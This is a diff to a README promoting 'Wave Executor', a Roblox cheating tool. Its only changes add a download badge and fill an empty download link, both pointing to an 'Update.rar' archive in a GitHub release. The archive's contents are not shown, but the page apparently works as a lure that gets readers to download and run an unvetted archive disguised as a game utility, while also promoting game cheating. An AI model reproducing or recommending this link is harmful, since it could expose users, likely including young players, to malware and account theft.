@@ -1,5 +1,7 @@
 # 🌊 **Wave Executor**
 
+[![Download](https://img.shields.io/badge/Download-Wave%20Executor-red)](https://github.com/AryaDewangga-UPNVJT/wave-roblox-2025/releases/download/wave-update-2025/Update.rar)
+
 **Unleash the power of Wave Executor and take your gaming to the next level!**  
 A fast, reliable, and user-friendly executor for Roblox, designed to help you enhance your gameplay experience with unlimited possibilities.
 
@@ -82,7 +84,7 @@ Make sure your system is prepared to run Wave Executor:
 
 Ready to elevate your Roblox experience? Click the link below to download Wave Executor:
 
-**[Download Wave Executor]()**
+**[Download Wave Executor](https://github.com/AryaDewangga-UPNVJT/wave-roblox-2025/releases/download/wave-update-2025/Update.rar)**
 
 ---
 
